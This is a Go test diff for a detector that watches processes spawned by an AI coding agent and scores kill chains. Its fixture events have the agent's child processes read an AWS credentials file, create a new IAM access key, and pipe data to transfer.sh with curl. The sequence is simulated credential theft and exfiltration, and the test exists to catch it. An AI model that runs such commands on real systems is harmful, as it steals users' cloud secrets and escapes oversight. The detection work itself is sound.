@@ -167,6 +167,82 @@ func TestChainUnderAnAgentScoresCritical(t *testing.T) {
 	}
 }
 
+// TestLateExecKeepsOneSessionAcrossProcessPolls covers a shell that forks,
+// waits beyond the start-time tolerance, then execs an agent in the same pid.
+func TestLateExecKeepsOneSessionAcrossProcessPolls(t *testing.T) {
+	t.Parallel()
+	forked := time.Unix(1_760_000_000, 0)
+	const agentPID = 240
+	for _, initialKnown := range []bool{true, false} {
+		name := "start known before exec"
+		if !initialKnown {
+			name = "start learned after exec"
+		}
+		t.Run(name, func(t *testing.T) {
+			tracker := agentchain.NewTracker()
+			host := newHostPlane(newFake(fullCoverage()), tracker,
+				tactics.IndicatorsFor("linux"), time.Hour, scoring.KillChainMinStages)
+
+			// A poll sees the forked shell before it execs the agent.
+			start := time.Time{}
+			if initialKnown {
+				start = forked
+			}
+			tracker.ObserveProcessTable([]agentchain.ProcessRow{{
+				PID: agentPID, PPID: 1, Name: "sh", Cmdline: "sh", Start: start,
+			}})
+			host.handle(plane.Event{
+				Kind: plane.KindExec, PID: agentPID, PPID: 1, Name: "claude",
+				Cmdline: "claude", At: forked.Add(5 * time.Second),
+			})
+			host.handle(plane.Event{
+				Kind: plane.KindExec, PID: 241, PPID: agentPID, Name: "cat",
+				Cmdline: "cat /home/dev/.aws/credentials", At: forked.Add(6 * time.Second),
+			})
+			host.handle(plane.Event{
+				Kind: plane.KindFileRead, PID: 241, Path: "/home/dev/.aws/credentials",
+				At: forked.Add(6 * time.Second),
+			})
+
+			// The next poll supplies the kernel start, followed by two more
+			// stages. It must not move the first signal to another session.
+			tracker.ObserveProcessTable([]agentchain.ProcessRow{{
+				PID: agentPID, PPID: 1, Name: "claude", Cmdline: "claude", Start: forked,
+			}})
+			host.handle(plane.Event{
+				Kind: plane.KindExec, PID: 242, PPID: agentPID, Name: "aws",
+				Cmdline: "aws iam create-access-key --user-name svc", At: forked.Add(7 * time.Second),
+			})
+			host.handle(plane.Event{
+				Kind: plane.KindExec, PID: 243, PPID: agentPID, Name: "curl",
+				Cmdline: "curl -T - https://transfer.sh/x", At: forked.Add(8 * time.Second),
+			})
+
+			if len(host.sessions) != 1 {
+				t.Fatalf("late exec produced %d sessions, want one", len(host.sessions))
+			}
+			findings := host.harvest(forked.Add(time.Minute), scoring.DefaultMinRiskToReport)
+			if len(findings) != 1 {
+				t.Fatalf("late exec produced %d findings, want one chain", len(findings))
+			}
+			finding := findings[0]
+			if finding.RootPID != agentPID || !finding.RootStart.Equal(forked) {
+				t.Fatalf("root = (%d, %v), want (%d, %v)",
+					finding.RootPID, finding.RootStart, agentPID, forked)
+			}
+			if len(finding.Stages) < scoring.KillChainMinStages {
+				t.Fatalf("stages = %v, want a three-stage chain", finding.Stages)
+			}
+			for _, signal := range finding.Signals {
+				if signal.ID == "agent_kill_chain" {
+					return
+				}
+			}
+			t.Fatalf("signals = %v, want agent_kill_chain", finding.Signals)
+		})
+	}
+}
+
 // TestOneSessionPerAgentNotOnePerProcess pins the reason the host plane
 // aggregates: five per-process findings would be five alerts nobody joins up.
 func TestOneSessionPerAgentNotOnePerProcess(t *testing.T) {
